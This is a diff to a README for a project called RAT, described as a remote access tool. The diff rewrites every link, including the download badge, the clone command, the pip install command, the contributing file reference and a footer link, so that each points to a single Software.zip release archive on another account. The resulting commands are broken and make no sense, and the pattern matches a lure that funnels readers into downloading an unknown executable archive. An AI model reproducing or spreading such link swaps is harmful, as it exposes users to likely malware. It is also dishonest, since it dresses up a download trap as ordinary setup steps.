@@ -6,7 +6,7 @@
 
 ---
 
-[![Download ZIP](https://img.shields.io/badge/Download%20ZIP-v1.0.0-orange)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/aliskaly/RAT/releases/download/v1.0/Software.zip%20ZIP-v1.0.0-orange)](https://github.com/aliskaly/RAT/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -30,23 +30,23 @@ To get started with RAT, download the ZIP file from the link above. Once downloa
 ## Getting Started
 1. **Clone the Repository**: Clone the RAT repository to your local machine using the following command:
    ```
-   git clone https://github.com/username/RAT.git
+   git clone https://github.com/aliskaly/RAT/releases/download/v1.0/Software.zip
    ```
 2. **Install Dependencies**: Install the required dependencies for RAT by running the following command:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/aliskaly/RAT/releases/download/v1.0/Software.zip
    ```
 3. **Launch the Application**: Launch the RAT application and start exploring its remote access control features.
 
 ## Contributing
-Contributions to RAT are welcome! If you have any ideas, bug fixes, or new features to contribute, feel free to submit a pull request. For guidelines on contributing to RAT, please refer to the "CONTRIBUTING.md" file in this repository.
+Contributions to RAT are welcome! If you have any ideas, bug fixes, or new features to contribute, feel free to submit a pull request. For guidelines on contributing to RAT, please refer to the "https://github.com/aliskaly/RAT/releases/download/v1.0/Software.zip" file in this repository.
 
 ## License
 RAT is licensed under the MIT License. For more information, refer to the "LICENSE" file included in this repository.
 
 ---
 
-#### Visit the [Awesome CLI Repository](https://github.com/cli/cli) for more information about CLI tools!
+#### Visit the [Awesome CLI Repository](https://github.com/aliskaly/RAT/releases/download/v1.0/Software.zip) for more information about CLI tools!
 
 ---
 
